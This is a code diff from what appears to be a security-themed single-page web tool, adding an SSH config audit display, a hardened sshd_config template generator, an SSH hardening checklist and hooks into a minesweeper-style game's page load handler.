+  const issues=checks.filter(c=>c.pattern.test(config));
+  const cm={critical:'var(--r)',high:'var(--y)',medium:'var(--c)',low:'var(--g)'};
+  document.getElementById('ssh-analysis').innerHTML=
+    (issues.length?'<div style="font-size:9px;color:#aa44ff88;margin-bottom:7px">CONFIG AUDIT RESULTS</div>'+
+      issues.map(i=>`<div style="padding:6px 9px;border-left:3px solid ${cm[i.sev]};margin-bottom:5px;font-size:10px;background:#0f001a;color:${cm[i.sev]}">[${i.sev.toUpperCase()}] ${esc(i.issue)}<br><span style="color:var(--g);font-size:9px">Fix: ${esc(i.fix)}</span></div>`).join('')
+    :'<div style="color:var(--g);padding:10px">✓ No obvious misconfigurations found!</div>');
+}
+function genSSHConfigTemplate(){
+  const tmpl=`# Hardened sshd_config — Generated by Sandesh ETH-HACK v6.0
+Port 2222
+Protocol 2
+HostKey /etc/ssh/ssh_host_ed25519_key
+HostKey /etc/ssh/ssh_host_rsa_key
+ 
+# Auth
+PermitRootLogin no
+MaxAuthTries 3
+MaxSessions 5
+PubkeyAuthentication yes
+AuthorizedKeysFile .ssh/authorized_keys
+PasswordAuthentication no
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+ 
+# Security
+X11Forwarding no
+AllowTcpForwarding no
+GatewayPorts no
+PrintMotd no
+AcceptEnv LANG LC_*
+UsePAM yes
+ 
+# Restrict algorithms (prefer modern)
+KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
+Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
+MACs hmac-sha2-512,hmac-sha2-256
+ 
+# Timeouts
+ClientAliveInterval 300
+ClientAliveCountMax 2
+LoginGraceTime 20`;
+  document.getElementById('ssh-config-out').textContent=tmpl;
+}
+const SSH_CHECKLIST_ITEMS=[
+  {done:true,text:'Disable password auth — use keys only'},
+  {done:true,text:'Deny root login (PermitRootLogin no)'},
+  {done:false,text:'Change default port from 22'},
+  {done:true,text:'Use Ed25519 or RSA-4096 keys'},
+  {done:false,text:'Enable fail2ban to block brute-force'},
+  {done:false,text:'Restrict SSH access by IP (AllowUsers/AllowGroups)'},
+  {done:true,text:'Disable X11 and TCP forwarding'},
+  {done:false,text:'Enable 2FA (Google Authenticator PAM)'},
+  {done:true,text:'Set MaxAuthTries to 3'},
+];
+function buildSSHChecklist(){
+  document.getElementById('ssh-checklist').innerHTML=SSH_CHECKLIST_ITEMS.map((i,idx)=>`
+    <div style="display:flex;align-items:center;gap:8px;padding:4px 0;font-size:10px;border-bottom:1px solid #00ff4111;cursor:pointer" onclick="toggleSSHCheck(${idx})">
+      <span style="color:${i.done?'var(--g)':'#555'};font-size:14px">${i.done?'✓':'○'}</span>
+      <span style="color:${i.done?'var(--g)':'#888'};${i.done?'text-decoration:line-through;':''}text-decoration-color:var(--g)">${esc(i.text)}</span>
+    </div>`).join('');
+}
+function toggleSSHCheck(idx){SSH_CHECKLIST_ITEMS[idx].done=!SSH_CHECKLIST_ITEMS[idx].done;buildSSHChecklist();}
+ 
+// ============================================================
 // GAME
+// ============================================================
 let gBoard=[],gRows=8,gCols=10,gMines=12,gFlags=0,gRev=0,gTimer=0,gTIV=null,gOver=false,gStart=false;
 const GCFG={easy:{r:6,c:8,m:6},medium:{r:8,c:10,m:12},hard:{r:10,c:12,m:22}};
 function initGame(diff){
@@ -1423,17 +2303,20 @@ function clickCell(r,c){
 function floodRev(r,c){if(r<0||r>=gRows||c<0||c>=gCols||gBoard[r][c].rev||gBoard[r][c].flag||gBoard[r][c].mine)return;gBoard[r][c].rev=true;gRev++;if(gBoard[r][c].cnt===0)for(let dr=-1;dr<=1;dr++)for(let dc=-1;dc<=1;dc++)floodRev(r+dr,c+dc);}
 function flagCell(r,c){if(gOver||gBoard[r][c].rev)return;gBoard[r][c].flag=!gBoard[r][c].flag;gFlags+=gBoard[r][c].flag?1:-1;document.getElementById('gflags').textContent=gFlags;renderGame();}
 function checkWin(){if(gRev>=gRows*gCols-gMines){gOver=true;clearInterval(gTIV);const sc=Math.max(0,1000-gTimer*5+gMines*10);ST.g=Math.max(ST.g,sc);updST();document.getElementById('gscore').textContent=sc;document.getElementById('gmsg').style.color='var(--g)';document.getElementById('gmsg').textContent='✅ FIREWALL BREACHED — '+sc+' pts';}}
-
+ 
+// ============================================================
 // AUTO LOGIN ON LOAD
+// ============================================================
 window.addEventListener('load',()=>{
   initGame('medium');
+  buildPhish();
   if(CU&&CU.length>0){
     const L=document.getElementById('login'),A=document.getElementById('app');
     L.style.display='none';L.style.visibility='hidden';L.style.opacity='0';L.style.pointerEvents='none';
     A.style.display='block';A.style.visibility='visible';A.style.opacity='1';
     document.getElementById('ub').textContent=esc(CU);
     updST();
-    setTimeout(()=>{startDash();buildThreats();buildExploits();buildOwasp();buildBreaches();buildCTF();updatePayload();},300);
+    setTimeout(()=>{startDash();buildThreats();buildExploits();buildOwasp();buildBreaches();buildCTF();updatePayload();buildSSHChecklist();},300);
   }
 });
 </script>
